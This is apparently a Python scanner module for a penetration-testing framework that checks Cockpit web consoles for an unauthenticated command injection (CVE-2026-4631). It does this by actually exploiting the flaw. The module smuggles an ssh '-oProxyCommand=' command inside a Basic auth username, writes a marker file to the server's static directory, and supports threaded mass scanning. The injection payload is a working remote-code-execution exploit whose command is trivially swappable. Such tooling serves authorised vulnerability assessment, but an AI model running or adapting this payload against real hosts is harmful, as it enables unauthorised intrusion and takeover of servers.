import base64
import ssl
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

MARKER_FILE = "metis_4631_probe"

@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""

class CockpitCve20264631Scanner(Auxiliary):
    NAME = "Cockpit Web Console RCE Detection (CVE-2026-4631)"
    DESCRIPTION = (
        "Detects the unauth command injection in Cockpit's login flow. "
        "Sends a crafted Authorization: Basic header whose username is a "
        "command substitution, then probes /cockpit/static/<marker>.txt "
        "for the marker written by the injected command. Requires that "
        "the login endpoint serves the /cockpit path."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "excellent"
    SEVERITY = "critical"
    DISCLOSED = "2026-02-20"
    CHECK = True
    REFERENCES = [
        "CVE-2026-4631",
        "https://nvd.nist.gov/vuln/detail/CVE-2026-4631",
    ]
    OPTIONS = [
        Option("RHOSTS", required=True, description="target(s)"),
        Option("RPORT", default=9090, type=int, description="Cockpit HTTP port"),
        Option("SSL", default=True, type=bool, description="use HTTPS"),
        Option("MARKER_FILE", default=MARKER_FILE, description="marker filename to write"),
        Option("TIMEOUT", default=10.0, type=float, description="per-request timeout"),
        Option("THREADS", default=10, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool, description="stop after first vulnerable host"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts: raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _base(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return scheme + "://" + host + ":" + str(self.options["RPORT"])

    def _probe(self, host):
        ctx = ssl._create_unverified_context()
        marker = self.options["MARKER_FILE"]
        cmd = "echo CVE-2026-4631 > /usr/share/cockpit/static/" + marker + ".txt"
        user = "root"
        injected = user + " -oProxyCommand=" + cmd
        token = base64.b64encode((injected + ":x").encode()).decode()
        url = self._base(host) + "/cockpit/login"
        req = urllib.request.Request(url)
        req.add_header("Authorization", "Basic " + token)
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        try:
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                _ = r.read(4096); status = r.status
        except urllib.error.HTTPError as e:
            status = e.code
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", type(e).__name__)
        if status not in (401, 403):
            return HostResult(host, "safe", "login HTTP " + str(status))

        probe_url = self._base(host) + "/cockpit/static/" + marker + ".txt"
        try:
            req = urllib.request.Request(probe_url)
            req.add_header("User-Agent", "Mozilla/5.0 (metis)")
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                text = r.read().decode(errors="replace"); pstatus = r.status
        except urllib.error.HTTPError as e:
            return HostResult(host, "safe", "marker file returned HTTP " + str(e.code))
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", type(e).__name__)
        if pstatus == 200 and "CVE-2026-4631" in text:
            return HostResult(host, "vulnerable", "marker file written")
        return HostResult(host, "safe", "login 401 but no marker file")

    def _record(self, h):
        svc = "https" if self.options["SSL"] else "http"
        self.report_host(h.host, state="up")
        self.report_service(h.host, self.options["RPORT"], proto="tcp",
                            state="open", name=svc, banner="Cockpit Web Console")
        self.report_vuln(name=self.NAME, address=h.host, severity="critical",
                         refs="CVE-2026-4631", info=h.detail)

    def check(self):
        host = self._expand_targets()[0]
        print(colors.info("check: probing " + self._base(host)))
        r = self._probe(host)
        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " vulnerable (" + r.detail + ")"))
            return CheckResult.VULNERABLE
        if r.state == "safe":
            print(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
            return CheckResult.SAFE
        print(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"]); stop_first = self.options["STOP_ON_FIRST"]
        print(colors.info("scanning " + str(len(targets)) + " host(s)"))
        bar = ProgressBar(total=len(targets), prefix="scan")
        hits, clean, unknown, aborted = [], 0, 0, False
        db = self._db(); ws = bool(db and db.current_workspace_id())
        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try: r = fut.result()
                    except Exception: unknown += 1; continue
                    if r.state == "vulnerable":
                        hits.append(r); bar.log(colors.vuln(r.host + " - " + r.detail))
                        if ws: self._record(r)
                        if stop_first:
                            aborted = True
                            for f in futures: f.cancel()
                            break
                    elif r.state == "safe": clean += 1
                    else: unknown += 1
        finally:
            bar.done()
        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.warn(str(unknown)))
        if aborted: print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        return hits
